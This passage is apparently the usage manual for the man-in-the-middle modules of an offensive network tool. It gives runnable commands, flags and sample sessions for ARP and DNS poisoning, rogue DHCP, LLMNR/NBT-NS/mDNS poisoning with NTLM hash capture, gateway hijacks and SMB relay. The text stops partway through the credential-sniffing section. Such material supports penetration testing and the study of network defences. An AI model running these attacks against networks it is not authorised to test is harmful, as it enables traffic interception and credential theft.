# Man-in-the-Middle

NetDestruct MITM modules.

| Module | Section |
|--------|---------|
| ICMP redirect | [ICMP Redirect](#icmp-redirect) |
| 802.1X MitM | [802.1X MitM](#8021x-mitm) |
| 802.1Q ARP poison | [802.1Q ARP Poisoning](#8021q-arp-poisoning) |
| DNS hijack | [DNS Hijacking](#dns-hijacking) |
| DHCP rogue | [DHCP Rogue Server](#dhcp-rogue-server) |
| DHCP / DHCPv6 spoof | [DHCP Spoofing](#dhcp-spoofing), [DHCPv6 Spoofing](#dhcpv6-spoofing) |
| Name poison + fake SMB | [LLMNR](#llmnr-poison), [NBT-NS](#nbt-ns-poison), [mDNS](#mdns-poison), [Fake SMB](#fake-smb-capture) |
| ARP scan / poison | [ARP Scan](#arp-scan-mitm), [ARP Poison](#arp-poison) |
| STP / RSTP hijack | [STP / RSTP Hijack](#stp--rstp-hijack) |
| HSRP / VRRP hijack | [HSRP / HSRPv2 / VRRP Hijack](#hsrp--hsrpv2--vrrp-hijack) |
| SMB relay | [SMB Relay](#smb-relay) |
| Credential sniffing | [Credential Sniffing](#credential-sniffing) |

---

## ICMP Redirect

Forge ICMP Redirect messages so victims install the attacker as the preferred gateway for off-subnet traffic.

### Usage

```bash
sudo ./NetDestruct --icmp --redirect -I eth0 --target 192.168.109.110
```

Multiple victims:

```bash
sudo ./NetDestruct --icmp --redirect -I eth0 --target 192.168.109.110,192.168.109.111
```

Range:

```bash
sudo ./NetDestruct --icmp --redirect -I eth0 --target 192.168.109.100-110
```

### Flags

| Flag | Description |
|------|-------------|
| `--icmp` | Enable ICMP MitM mode |
| `--redirect` | Run ICMP redirect attack |
| `-I` / `--interface` | Network interface on the victim segment |
| `--target` | Victim IP(s): single, comma-separated, CIDR, or last-octet range |

### Interactive prompts

After launch, the tool asks:

1. **ARP spoofing** — `Activate ARP spoofing for the target(s)? [y/N]`
   - `y` — starts background ARP/NDP poisoning for the same targets (uses interface MAC)
   - `n` — ICMP redirect only

2. **Default gateway** — `Default gateway IP:`
   - Enter the real gateway address; redirect packets spoof this IP as the ICMP source

### Behavior

- Sends **ICMP Redirect** (type 5, code 1) with gateway field set to the attacker’s interface IPv4
- Embeds a synthetic original datagram: victim → `8.8.8.8` TCP SYN (matches the reference exploit)
- Bursts **5** redirects per victim, then repeats every **10** seconds until Ctrl+C
- Attacker IPv4 is taken from the selected interface address

### Output colors

| Tag | Color | Meaning |
|-----|-------|---------|
| `[ICMP]` | Blue | General ICMP MitM status |
| `[ICMP Redirect]` | Green | Successful redirect sent |
| `[Destination Unreachable]` | Orange | Skipped/failed victims or errors |
| `[ARP]` | Orange | ARP/NDP poisoning activity |

### Requirements

- Linux with root or `CAP_NET_RAW`
- IPv4 victims and IPv4 gateway (ICMPv4 redirect)
- Same L2 broadcast domain as targets

### Example session

```
$ sudo ./NetDestruct --icmp --redirect -I eth0 --target 192.168.109.110
[ICMP] Starting ICMP Redirect attack...
Activate ARP spoofing for the target(s)? [y/N]: y
Default gateway IP: 192.168.109.1
[ICMP Redirect] Sent to 192.168.109.110 → use 192.168.109.130 as gateway
[ARP] Poisoned answer sent to 192.168.109.110
[ARP] ARP poisoning successful: 192.168.109.110 is-at aa:bb:cc:dd:ee:ff
```

### Related MITM modules

| Module | Flags |
|--------|-------|
| DNS hijack | `--dns --hijack -I --target ...` |
| ARP poison | `--arp --poison -I --ip <targets>` |
| ARP cage | `--arp --cage -I --subnet ... --target ...` |
| HSRP hijack | `--hsrp --hijack -I --group ... --src ... --virtual-ip ...` |
| VRRP hijack | `--vrrp --hijack -I --group ... --src ... --virtual-ip ...` |
| STP hijack | `--stp --hijack -I --mac ...` |
| DHCP rogue server | `--dhcp --rouge -I` |
| DHCP spoofing | `--dhcp-spoofing -I` |
| 802.1X MitM | `--802.1x --mitm --interface1 ... --interface2 ...` |
| 802.1Q ARP poison | `--802.1q --arp-poison -I --dst-vlan ... --dst-ip ... --src-ip ...` |

Implementation: `libs/mitm/icmpredirect/`

---

## 802.1X MitM

Bridge 802.1X/EAPOL traffic between an authenticator (switch) and a supplicant (client) on two interfaces.

### Topology

```
[Authenticator/Switch] --- interface1 --- [NetDestruct] --- interface2 --- [Supplicant/Client]
```

### Usage

```bash
sudo ./NetDestruct --802.1x --mitm --interface1 eth0 --interface2 eth1
```

With custom source MAC override:

```bash
sudo ./NetDestruct --802.1x --mitm --interface1 eth0 --interface2 eth1 --src-mac 02:11:22:33:44:55
```

### Flags

| Flag | Description |
|------|-------------|
| `--802.1x` | Enable 802.1X mode |
| `--mitm` | Required with `--802.1x` for bridge MitM |
| `--interface1` | Interface on the authenticator (switch) side |
| `--interface2` | Interface on the supplicant (client) side |
| `--src-mac` | Optional MAC override; defaults to each interface's hardware address for loopback filtering |

### Behavior

- Opens raw sockets on both interfaces (promiscuous mode)
- Learns **authenticator MAC** from the first 802.1X frame on `--interface1`
- Learns **supplicant MAC** from the first 802.1X frame on `--interface2`
- Relays EAPOL transparently between sides, impersonating learned peer MACs:
  - Authenticator → supplicant: `src=auth_mac`, `dst=supp_mac` on interface2
  - Supplicant → authenticator: `src=supp_mac`, `dst=auth_mac` on interface1
- Skips frames sourced from the relayed peer MAC to avoid loops
- Prints every received 802.1X packet Decode (Linux cooked capture, 802.1X Authentication, EAP/EAPOL fields)
- Runs until Ctrl+C

### Output color

- `[802.1X]` is **cream**

### Requirements

- Linux with root or `CAP_NET_RAW`
- Two physical or virtual interfaces wired between authenticator and supplicant
- Both sides must be actively exchanging 802.1X/EAPOL for MAC learning to succeed

### Example session

```
$ sudo ./NetDestruct --802.1x --mitm --interface1 eth0 --interface2 eth1
[802.1X] Waiting for authenticator 802.1X frame on eth0...
[802.1X] Authenticator MAC = 0c:d4:08:34:00:00
[802.1X] Waiting for supplicant 802.1X frame on eth1...
[802.1X] Supplicant MAC = 00:11:22:33:44:55
[802.1X] Bridging 802.1X between eth0 and eth1 (Ctrl+C to stop)
[802.1X] Recieved 802.1X data from 0c:d4:08:34:00:00 (authenticator):
Linux cooked capture v1
    Packet type: Multicast (2)
    ...
```

Implementation: `libs/mitm/dot1xmitm/`

---

## 802.1Q ARP Poisoning

802.1Q VLAN ARP poisoning and traffic relay on a target VLAN.

### Usage

```bash
sudo ./NetDestruct --802.1q --arp-poison -I eth0 --dst-vlan 10 --dst-ip 192.168.10.50 --src-ip 192.168.10.1
```

With custom source MAC and ICMP payload:

```bash
sudo ./NetDestruct --802.1q --arp-poison -I eth0 --dst-vlan 10 --dst-ip 192.168.10.50 --src-ip 192.168.10.1 \
  --src-mac 02:11:22:33:44:55 --payload "mamad"
```

### Flags

| Flag | Description |
|------|-------------|
| `--802.1q` | Enable 802.1Q mode |
| `--arp-poison` | Required with `--802.1q` for VLAN ARP poisoning |
| `-I` / `--interface` | Interface on the target segment |
| `--dst-vlan` | Target VLAN ID (0–4095) |
| `--dst-ip` | Victim IP to poison (ARP reply claims this IP is at the attacker MAC) |
| `--src-ip` | Spoofed source IP in ARP request used to learn the victim MAC |
| `--src-mac` | Optional source MAC override; default is interface MAC |
| `--payload` | Optional ICMP echo payload sent on the target VLAN after MAC learn; defaults to `Cisco Production` |

### Behavior

1. **Learn victim MAC** — sends 802.1Q-tagged ARP requests (`--src-ip` → who has `--dst-ip`?) on `--dst-vlan` until an ARP reply is received
2. **ARP poison loop** — every second, broadcasts 802.1Q-tagged ARP replies claiming `--dst-ip` is at the attacker MAC
3. **ICMP probe** — sends one 802.1Q-tagged ICMP echo on `--dst-vlan` with `--payload` (default `Cisco Production`)
4. **Relay** — frames destined to the attacker MAC are re-encapsulated and forwarded to the learned victim MAC (VLAN payload preserved)
5. **Sniff/print** — all received CDP, DTP, ARP, ICMP, and other 802.1Q-tagged traffic is decoded and printed

### Output colors

| Tag | Color | Meaning |
|-----|-------|---------|
| `[802.1Q]` | White | VLAN-tagged traffic |
| `[ICMP]` | Blue | VLAN-tagged ICMP |
| `[CDP]` | Blue | CDP advertisements |
| `[DTP]` | Orange | DTP frames |
| `[ARP]` | Orange | ARP activity and ARP-bearing frames |
| `[+]` | Green | Data received from `--dst-ip` (attack successful) |

### Printed decode

Lines per protocol, including:

- `802.1Q Virtual LAN, PRI: [n], DEI: [n] and ID: [n]` (single or QinQ tags)
- IPv4/IPv6 with ICMP echo details (type, id, seq, payload)
- ARP request/reply fields
- Full CDP and DTP TLV decode when present
- LLC/SNAP encapsulation for Cisco protocols

### Requirements

- Linux with root or `CAP_NET_RAW`
- L2 adjacency to the target VLAN (or trunk port that carries `--dst-vlan`)

### Example session

```
$ sudo ./NetDestruct --802.1q --arp-poison -I eth0 --dst-vlan 10 --dst-ip 192.168.10.50 --src-ip 192.168.10.1
[802.1Q] Learning MAC for 192.168.10.50 on VLAN 10...
[ARP] ARP spoofing MAC = aa:bb:cc:dd:ee:01
[802.1Q] Relaying traffic destined to 02:11:22:33:44:55 on VLAN 10 (Ctrl+C to stop)
[+] recieved data from 192.168.10.50, attack successful
[ICMP] Recieved 802.1Q ICMP data from aa:bb:cc:dd:ee:01 to ff:ff:ff:ff:ff:ff:
Linux cooked capture v1
802.1Q Virtual LAN, PRI: 7, DEI: 0 and ID: 10
Internet Protocol Version 4, Src: 192.168.10.1, Dst: 255.255.255.255
...
```

Implementation: `libs/mitm/dot1qpoison/`

---

## DNS Hijacking

Forge DNS replies to queries from victim hosts so every A/AAAA lookup resolves to the attacker’s interface address.

### Usage

```bash
sudo ./NetDestruct --dns --hijack -I eth0 --target 192.168.109.110
```

Single domain:

```bash
sudo ./NetDestruct --dns --hijack -I eth0 --target 192.168.109.110 --spoof-domain login.cisco.com
```

Multiple domains:

```bash
sudo ./NetDestruct --dns --hijack -I eth0 --target 192.168.109.110 --spoof-domain login.cisco.com,portal.cisco.com
```

Domain list file (one domain per line, `#` comments allowed):

```bash
sudo ./NetDestruct --dns --hijack -I eth0 --target 192.168.109.110 --spoof-domain domains.txt
```

Multiple victims:

```bash
sudo ./NetDestruct --dns --hijack -I eth0 --target 192.168.109.110,192.168.109.111
```

Range:

```bash
sudo ./NetDestruct --dns --hijack -I eth0 --target 192.168.109.100-110
```

IPv6 victim:

```bash
sudo ./NetDestruct --dns --hijack -I eth0 --target 2001:db8::10
```

### Flags

| Flag | Description |
|------|-------------|
| `--dns` | Enable DNS hijacking mode |
| `--hijack` | Required with `--dns` (shared hijack switch for FHRP/STP/DNS) |
| `-I` / `--interface` | Network interface on the victim segment |
| `--target` | Victim IP(s): single, comma-separated, CIDR, or IPv4 last-octet range |
| `--spoof-domain` | Domain(s) to spoof to your interface IP: single name, comma-separated list, or file path (`*`/`?` wildcards supported). Omit to spoof **all** queries |

### Interactive prompts

After launch, the tool asks:

1. **ARP spoofing** — `Activate ARP spoofing for the target(s)? [y/N]`
   - `y` — starts background ARP/NDP poisoning so victim DNS traffic reaches the attacker
   - `n` — DNS spoofing only (works when you are already on-path)

2. **Default gateway** — `Default gateway IP:`
   - Enter the real gateway address (used by ARP poisoning when enabled)

### Behavior

- Sniffs **UDP/53** DNS queries on the selected interface
- Responds only to queries **from** IPs in `--target`
- With `--spoof-domain`, only matching hostnames are poisoned; without it, every observed query is spoofed
- For **A** queries, replies with the interface **IPv4** address
- For **AAAA** queries, replies with the interface **IPv6** address (when present)
- Spoofed replies appear to come from the DNS server the victim originally queried (src/dst and UDP ports swapped)
- Runs until Ctrl+C

### Output colors

| Tag | Color | Meaning |
|-----|-------|---------|
| `[DNS]` | Cyan | DNS hijack status and spoofed replies |
| `[ARP]` | Orange | ARP/NDP poisoning activity (when enabled) |

### Requirements

- Linux with root or `CAP_NET_RAW`
- Same L2 broadcast domain as targets (or on-path via ARP spoofing)
- Victims must send DNS queries the attacker can observe (typically port 53 to a resolver)

### Example session

```
$ sudo ./NetDestruct --dns --hijack -I eth0 --target 192.168.109.110
[DNS] Starting DNS hijacking...
Activate ARP spoofing for the target(s)? [y/N]: y
Default gateway IP: 192.168.109.1
[DNS] Listening for UDP/53 queries from 1 target(s)
[ARP] Poisoned answer sent to 192.168.109.110
[ARP] ARP poisoning successful: 192.168.109.110 is-at aa:bb:cc:dd:ee:ff
[+] recieved DNS QUERY type A from 192.168.109.110:54321 : login.cisco.com
[+] spoofed response sent to 192.168.109.110
```

Implementation: `libs/mitm/dns/`

---

## DHCP Rogue Server

Run a configurable DHCPv4 rogue server that listens for client DISCOVER and REQUEST messages, replies with forged OFFER and ACK packets from a sequential IP pool, and logs all DHCP traffic on the wire.

### Usage

```bash
sudo ./NetDestruct --dhcp --rouge -I eth0
```

### Flags

| Flag | Description |
|------|-------------|
| `--dhcp` | Enable DHCP mode (use with `--rouge` for rogue server) |
| `--rouge` | Run the rogue DHCP server |
| `-I` / `--interface` | Interface to send/sniff DHCP on |

### Interactive prompts

After launch, the tool asks (in order):

1. `Enter Server ID:` — DHCP Server Identifier (option 54 / IPv4 source address)
2. `Enter Start IP:` — first address handed out from the pool
3. `Enter End IP:` — last address in the pool
4. `Enter Lease Time (secs):` — option 51 IP Address Lease Time
5. `Enter Renew Time (secs):` — option 58 Renewal Time Value
6. `Enter Subnet Mask:` — option 1 Subnet Mask
7. `Enter Router:` — option 3 default gateway (also used as siaddr)
8. `Enter DNS Server:` — option 6 Domain Name Server
9. `Enter Domain:` — option 15 Domain Name

### Behavior

- Waits for DHCP DISCOVER or REQUEST on UDP ports 67/68
- On **DISCOVER**: sends **DHCPOFFER** with the current pool address (does not advance the pool)
- On **REQUEST**: sends **DHCPACK** with the same pool address, then advances to the next address
- Stops when the pool is exhausted (start through end inclusive)
- Logs client messages (`DISCOVER`, `REQUEST`, etc.) and server replies (including legitimate server OFFER/ACK seen on the wire)
- Replies use the client's original BOOTP header fields (xid, flags, chaddr) for broad client compatibility
- Runs until the pool is exhausted or Ctrl+C

### Output color

- `[DHCP]` is **purple**

### Example session

```
$ sudo ./NetDestruct --dhcp --rouge -I eth0
Using interface :eth0
Enter Server ID: 192.168.1.1
Enter Start IP: 192.168.1.100
Enter End IP: 192.168.1.110
Enter Lease Time (secs): 86400
Enter Renew Time (secs): 43200
Enter Subnet Mask: 255.255.255.0
Enter Router: 192.168.1.1
Enter DNS Server: 192.168.1.1
Enter Domain: cyber.lab

[DHCP] Rogue DHCP server on eth0 (pool 192.168.1.100-192.168.1.110, server-id 192.168.1.1)
[DHCP] Waiting for DISCOVER/REQUEST... (Ctrl+C to stop)
[DHCP] 00:0C:29:AB:CD:EF DISCOVER
[DHCP] fake OFFER 00:0C:29:AB:CD:EF offering 192.168.1.100
[DHCP] 192.168.1.1 : OFFER 192.168.1.100 255.255.255.0 GW 192.168.1.1 DNS 192.168.1.1 "cyber.lab"
[DHCP] 00:0C:29:AB:CD:EF REQUEST 192.168.1.100
[DHCP] fake ACK 00:0C:29:AB:CD:EF offering 192.168.1.100
[DHCP] 192.168.1.1 : ACK 192.168.1.100 255.255.255.0 GW 192.168.1.1 DNS 192.168.1.1 "cyber.lab"
```

### Requirements

- Linux with root or `CAP_NET_RAW`
- L2 adjacency to DHCP clients on the selected interface

Implementation: `libs/mitm/dhcp/rogue.go` (uses shared frame builder/parser in `libs/mitm/dhcp/`)

Related: `--dhcp-spoofing` runs a separate race-style DHCP poisoner with a different prompt flow.


---

## LLMNR Poison

Poison Link-Local Multicast Name Resolution (RFC 4795). When Windows cannot resolve a name via DNS, it multicasts an LLMNR query; NetDestruct answers with the attacker interface address so the client connects to the fake SMB capture server (started automatically).

### Usage

```bash
sudo ./NetDestruct --llmnr -I eth0
```

Combine with other name poisoners:

```bash
sudo ./NetDestruct --llmnr --nbt-ns --mdns -I eth0
```

### Flags

| Flag | Description |
|------|-------------|
| `--llmnr` | Enable LLMNR poisoner (UDP multicast `:5355`) |
| `-I` / `--interface` | Interface to join the multicast groups on |

### Behavior

- Joins IPv4 multicast `224.0.0.252:5355` and, if a link-local IPv6 address exists, `ff02::1:3:5355`
- Answers **A** / **ANY** queries with the interface IPv4; **AAAA** / **ANY** (IPv6 path) with the link-local IPv6
- Spoof TTL is **30** seconds
- Skips the attacker own queries; deduplicates log lines per `(srcIP, name)`
- Automatically starts the fake SMB NTLM capture server on TCP `:445` (see [Fake SMB Capture](#fake-smb-capture))
- Runs until Ctrl+C

### Output colors

| Tag | Color | Meaning |
|-----|-------|---------|
| `[LLMNR]` | Cyan | Poisoner status and poisoned answers |

### Requirements

- Linux with root (multicast listen / bind)
- Interface with an IPv4 address (IPv6 LLMNR is best-effort)

Implementation: `libs/mitm/llmnr/`

---

## NBT-NS Poison

Poison NetBIOS Name Service (RFC 1002). After DNS/LLMNR fail, Windows broadcasts NB queries on UDP/137; NetDestruct replies with the attacker IP and funnels SMB auth to the fake capture server.

### Usage

```bash
sudo ./NetDestruct --nbt-ns -I eth0
```

### Flags

| Flag | Description |
|------|-------------|
| `--nbt-ns` | Enable NBT-NS poisoner (UDP broadcast `:137`) |
| `-I` / `--interface` | Interface whose IPv4 is used in poisoned answers |

### Behavior

- Binds `0.0.0.0:137` to receive broadcast NB name queries
- Accepts classic broadcast queries (`FLAGS == 0x0110`, encoded name length `0x20`)
- Replies with NB type `0x0020`, TTL ≈ 300000 s, RDATA = interface IPv4
- Decodes the NetBIOS name and service suffix for logging
- Deduplicates log lines per `(srcIP, name)`
- Automatically starts the fake SMB NTLM capture server on TCP `:445`
- Runs until Ctrl+C

### Output colors

| Tag | Color | Meaning |
|-----|-------|---------|
| `[NBT-NS]` | Cyan | Poisoner status and poisoned answers |

### Requirements

- Linux with root (bind privileged port 137)
- Interface with an IPv4 address

Implementation: `libs/mitm/nbns/`

---

## mDNS Poison

Poison Multicast DNS (RFC 6762). Clients resolving `.local` names query `224.0.0.251` / `ff02::fb` on UDP/5353; NetDestruct answers with the attacker address for SMB capture.

### Usage

```bash
sudo ./NetDestruct --mdns -I eth0
```

### Flags

| Flag | Description |
|------|-------------|
| `--mdns` | Enable mDNS poisoner (`224.0.0.251:5353` + `ff02::fb:5353`) |
| `-I` / `--interface` | Interface to join mDNS multicast groups on |

### Behavior

- Joins IPv4 mDNS multicast; starts IPv6 listener in the background when a link-local address is present
- Answers **A** / **ANY** with interface IPv4; **AAAA** (IPv6 path) with link-local IPv6
- Spoof TTL is **120** seconds
- Skips responses (QR=1) and the attacker own queries
- Automatically starts the fake SMB NTLM capture server on TCP `:445`
- Runs until Ctrl+C

### Output colors

| Tag | Color | Meaning |
|-----|-------|---------|
| `[MDNS]` | Cyan | Poisoner status and poisoned answers |

### Requirements

- Linux with root
- Interface with an IPv4 address (IPv6 mDNS is best-effort)

Implementation: `libs/mitm/mdns/`

---

## Fake SMB Capture

There is no standalone CLI flag. Whenever any name poisoner runs (`--llmnr`, `--nbt-ns`, and/or `--mdns`), NetDestruct starts an SMB2 NTLM capture server on TCP `:445` in parallel. Poisoned clients that connect for file/auth traffic hit this endpoint and shed NTLM hashes.

### How it ties in

```
Victim name query  →  LLMNR / NBT-NS / mDNS poison (attacker IP)
Victim SMB :445    →  Fake SMB capture server (automatic)
                     →  prints NTLMv1-SSP / NTLMv2-SSP hashcat strings
```

`--smb-relay` uses a **separate** relay listener on `:445` and does **not** use this capture server.

### Behavior

1. Accepts TCP connections on `0.0.0.0:445`
2. Handles optional NetBIOS session request (`0x81` → `0x82`)
3. Upgrades SMBv1 negotiate with `SMB 2.???` to SMBv2; advertises dialect **SMB 2.1**
4. Issues NTLMSSP_CHALLENGE (fake domain `WORKGROUP`, workstation `DESKTOP`)
5. Parses NTLMSSP_AUTH → prints hash → replies `STATUS_LOGON_FAILURE`

### Output colors

| Tag | Color | Meaning |
|-----|-------|---------|
| `[SMB]` | Yellow | Connections, negotiate steps, captured hashes |

### Requirements

- Port **445** free on the attacker host (conflicts with a real SMB service or `--smb-relay`)
- Root typically required to bind `:445`

Implementation: `libs/mitm/smb/`

---

## ARP Scan (MitM)

Discover live IPv4 hosts on the selected interface subnet by broadcasting ARP requests and collecting replies. Distinct from intelligence-gathering `--arp-scan`.

### Usage

```bash
sudo ./NetDestruct --arp --scan -I eth0
```

### Flags

| Flag | Description |
|------|-------------|
| `--arp` | Enable ARP/NDP mode |
| `--scan` | Required with `--arp` for subnet host discovery |
| `-I` / `--interface` | Interface whose IPv4 subnet is swept |

`--arp` requires **exactly one** of `--scan`, `--poison`, or `--cage`.

### Interactive prompts

1. `MAC address:` — source MAC used in ARP requests
2. `Gateway IP:` — validated as an IP (required by the prompt flow)

### Behavior

- Enumerates host addresses in the interface IPv4 subnet (capped at a **/20**)
- Broadcasts ARP who-has for each host (skips self)
- Collects ARP replies for ~**3** seconds, then prints sorted online IP + MAC list

### Requirements

- Linux with root or `CAP_NET_RAW`
- Interface with an IPv4 address and subnet

Implementation: `libs/mitm/arp/` (`Scanner`)

---

## ARP Poison

Continuously poison ARP/NDP caches so targets treat the attacker MAC as the owners of selected IPs (and, for IPv4, as the gateway), enabling bidirectional L2 MitM.

### Usage

```bash
sudo ./NetDestruct --arp --poison -I eth0 --ip 192.168.1.10,192.168.1.20
```

IPv6 target (NDP gratuitous NA):

```bash
sudo ./NetDestruct --arp --poison -I eth0 --ip fe80::10
```

### Flags

| Flag | Description |
|------|-------------|
| `--arp` | Enable ARP/NDP mode |
| `--poison` | Required with `--arp` for cache poisoning |
| `-I` / `--interface` | Interface on the victim segment |
| `--ip` | Comma-separated target IPv4 and/or IPv6 addresses |

### Interactive prompts

1. `MAC address:` — attacker MAC claimed in poisoned replies
2. `Gateway IP:` — real gateway; used for the targeted “gateway is-at us” ARP lie

### Behavior

- Loop every **5** seconds for each target:
  - **IPv4**: broadcast gratuitous ARP reply (`target is-at attacker`); if the victim answers ARP, unicast a reply claiming the **gateway** is at the attacker MAC
  - **IPv6**: send gratuitous Neighbor Advertisement; confirm reachability with Neighbor Solicitation
- Runs until Ctrl+C

### Output colors

| Tag | Color | Meaning |
|-----|-------|---------|
| `[ARP]` | Orange | Poisoning activity |

### Requirements

- Linux with root or `CAP_NET_RAW`
- Same L2 broadcast domain as targets

Implementation: `libs/mitm/arp/` (`Poisoner`)

---

## DHCP Spoofing

Race the legitimate DHCPv4 (and optionally DHCPv6) server: forge OFFER/ACK so clients install the attacker as **router** and **DNS**. Distinct from `--dhcp --rouge`, which runs a full interactive rogue pool server.

### Usage

```bash
sudo ./NetDestruct --dhcp-spoofing -I eth0
```

### Flags

| Flag | Description |
|------|-------------|
| `--dhcp-spoofing` | DHCPv4 race-style spoofing (also handles DHCPv6 if link-local IPv6 is present) |
| `-I` / `--interface` | Interface to sniff/send DHCP on |

### Interactive prompts

1. `IP Pool:` — range like `192.168.0.2-254`
2. `Netmask:` — subnet mask for offered leases
3. `DNS Server IP (optional):` — blank defaults DNS to the attacker interface address

Gateway is the interface IPv4 (`Gateway IP: <iface-ip>`).

### Behavior

- On **DISCOVER**: fake **OFFER** from the next pool address; router/DNS = attacker
- On **REQUEST**: fake **ACK**; if the client named another server-id (option 54), the ACK **spoofs that server IP** while still setting router/DNS to the attacker
- If the interface has link-local IPv6, also spoofs DHCPv6 SOLICIT→ADVERTISE / REQUEST→REPLY
- Runs until Ctrl+C

### Output color

- `[DHCP]` is **bright purple**

### Difference from `--dhcp --rouge`

| | `--dhcp-spoofing` | `--dhcp --rouge` |
|--|-------------------|------------------|
| Style | Race / poison legitimate server | Standalone rogue server |
| Prompts | Pool, netmask, optional DNS | Full server-id, lease, renew, mask, router, DNS, domain |
| Gateway | Always attacker iface IP | Operator-entered router |
| DHCPv6 | Yes (if LL present) | No (v4 rogue only) |

### Requirements

- Linux with root or `CAP_NET_RAW`
- L2 adjacency to DHCP clients

Implementation: `libs/mitm/dhcp/` (`Poisoner`)

---

## DHCPv6 Spoofing

Rogue DHCPv6: periodic ICMPv6 Router Advertisements force clients onto DHCPv6, then Advertise/Reply assign addresses and point DNS at the attacker.

### Usage

```bash
sudo ./NetDestruct --dhcpv6-spoofing -I eth0
```

### Flags

| Flag | Description |
|------|-------------|
| `--dhcpv6-spoofing` | Rogue DHCPv6 + ICMPv6 RA (requires root) |
| `-I` / `--interface` | Interface with IPv6 link-local enabled |

### Behavior

1. Every **30** seconds, sends ICMPv6 RA to `ff02::1` with **M=1, O=1**, router lifetime **0**
2. On DHCPv6 **SOLICIT** → **ADVERTISE** (DNS = attacker link-local)
3. On **REQUEST** / **RENEW** directed to our DUID → **REPLY** with a stable per-MAC address
4. Runs until Ctrl+C

### Output color

- `[DHCPv6]` is **bright purple**

### Requirements

- Linux with root or `CAP_NET_RAW`
- IPv6 enabled on the interface
- Clients that honor RA M/O bits (typical Windows)

Implementation: `libs/mitm/dhcpv6/`

---

## STP / RSTP Hijack

Inject forged Spanning Tree BPDUs so the attacker becomes root bridge, influencing topology and traffic paths.

### Usage

```bash
sudo ./NetDestruct --stp --hijack -I eth0 --mac 00:11:22:33:44:55
sudo ./NetDestruct --rstp --hijack -I eth0 --mac 00:11:22:33:44:55
```

### Flags

| Flag | Description |
|------|-------------|
| `--stp` | Classic STP BPDU injection |
| `--rstp` | RSTP BPDU injection |
| `--hijack` | Required with `--stp` or `--rstp` |
| `-I` / `--interface` | Interface to emit BPDUs on |
| `--mac` | Attacker bridge/root MAC used in the BPDU |

`--stp` and `--rstp` cannot be combined. STP DoS floods (`--flood-conf` / `--flood-tcn`) are documented under [Denial of Service](../Denial%20of%20Service/README.md).

### Behavior

- Builds IEEE 802.3 LLC BPDUs to STP multicast `01:80:c2:00:00:00`
- **STP**: config BPDU with root/bridge ID derived from `--mac` (priority 0)
- **RSTP**: version-2 BPDU with proposal/agreement-style flags
- Sends immediately, then every **2** seconds until Ctrl+C

### Output colors

| Tag | Color | Meaning |
|-----|-------|---------|
| `[STP]` / `[RSTP]` | Yellow | Injection status |

### Requirements

- Linux with root or `CAP_NET_RAW`
- Switch ports participating in STP/RSTP

Implementation: `libs/mitm/stp/`

---

## HSRP / HSRPv2 / VRRP Hijack

Forge first-hop redundancy hellos/advertisements at priority **255** to seize the active/master role and attract gateway traffic.

### Usage

```bash
sudo ./NetDestruct --hsrp --hijack -I eth0 --group 1 --src 192.168.1.2 --virtual-ip 192.168.1.1
sudo ./NetDestruct --hsrp --hijack -I eth0 --group 1 --src 192.168.1.2 --virtual-ip 192.168.1.1 --auth cisco
sudo ./NetDestruct --hsrpv2 --hijack -I eth0 --group 1 --src 192.168.1.2 --virtual-ip 192.168.1.1
sudo ./NetDestruct --vrrp --hijack -I eth0 --group 1 --src 192.168.1.2 --virtual-ip 192.168.1.1
```

### Flags

| Flag | Description |
|------|-------------|
| `--hsrp` | HSRPv1 hijack (also used with `--capture` for offline cracking) |
| `--hsrpv2` | HSRPv2 hijack mode (requires `--hijack`) |
| `--vrrp` | VRRP hijack (also used with `--capture` for offline cracking) |
| `--hijack` | Inject forged hellos/advertisements |
| `-I` / `--interface` | Egress interface (source MAC = iface MAC) |
| `--group` | HSRP group or VRRP VRID (**0–255**, required) |
| `--src` | Spoofed source IPv4 of the injected packets |
| `--virtual-ip` | Virtual IP claimed in the hello/advertisement |
| `--auth` | Optional cleartext auth passphrase |

`--hsrp`, `--hsrpv2`, and `--vrrp` hijacking cannot be combined. Offline hash extraction is documented under [Authentication Cracking](../Authentication%20Cracking/README.md).

### Behavior

- Crafts full Ethernet frames on AF_PACKET
- **HSRP / HSRPv2**: Hello, state Active, priority **255**; retransmit every **3** s. `--hsrpv2` uses multicast `224.0.0.102`
- **VRRP**: VRRPv2 advertisement, priority **255**; retransmit every **3** s
- Runs until Ctrl+C

### Output colors

| Tag | Color | Meaning |
|-----|-------|---------|
| `[HSRP]` / `[HSRPv2]` | Orange | Injection status |
| `[VRRP]` | Magenta | Injection status |

### Requirements

- Linux with root or `CAP_NET_RAW`
- Matching group/VIP (and auth, if the LAN uses it)

Implementation: `libs/mitm/hsrp/`, `libs/mitm/vrrp/`

---

## SMB Relay

SMB→SMB NTLM relay. Starts LLMNR + NBT-NS + mDNS poisoners automatically, listens on `:445`, and relays credentials to `--relay-to`.

### Usage

```bash
sudo ./NetDestruct --smb-relay -I eth0 --relay-to 192.168.1.20
sudo ./NetDestruct --smb-relay -I eth0 --relay-from 192.168.1.50 --relay-to 192.168.1.20
```

### Flags

| Flag | Description |
|------|-------------|
| `--smb-relay` | Enable SMB NTLM relay (requires root) |
| `-I` / `--interface` | Interface for name poisoners |
| `--relay-to` | **Required.** Target IP to relay authentication to |
| `--relay-from` | Optional victim IP; default = poison/accept any host |

### Behavior

1. Pre-flight: checks TCP/445 and SMB signing on `--relay-to` (and `--relay-from` if set); aborts if signing is required
2. Launches LLMNR, NBT-NS, and mDNS poisoners in the background
3. Serves relay SMB2 on `:445`
4. Phase 1: local NTLM challenge to learn `DOMAIN/user`
5. On `TREE_CONNECT`: answers `STATUS_NETWORK_SESSION_EXPIRED` to force re-auth
6. Phase 2: forwards the victim NTLM exchange to `--relay-to`
7. On success: opens an interactive shell listener on `127.0.0.1:11000` (+1 per attack id)

Shell commands (e.g. `nc 127.0.0.1 11000`): `help`, `id`/`whoami`, `shares`, `use`/`tree <share>`, `exit`

### Output colors

| Tag | Color | Meaning |
|-----|-------|---------|
| `[SMB]` | Yellow | Relay status |

### Requirements

- Linux with root
- Port **445** free
- Target without mandatory SMB signing

Implementation: `libs/mitm/smbrelay/`

---

## Credential Sniffing

Passive credential extraction from live traffic or pcaps: cleartext protocols, HTTP auth, NTLM, Kerberos, SNMP communities, MSSQL logins.

### Usage

```bash
sudo ./NetDestruct --cred-sniffing -I eth0
sudo ./NetDestruct --cred-sniffing -I eth0 --ignore 192.168.1.100
./NetDestruct --cred-sniffing --pcap-file capture.pcap
./NetDestruct --cred-sniffing --pcap-dir ./pcaps --output-dir ./creds
```

### Flags

| Flag | Description |
|------|-------------|
| `--cred-sniffing` | Enable credential sniffing |
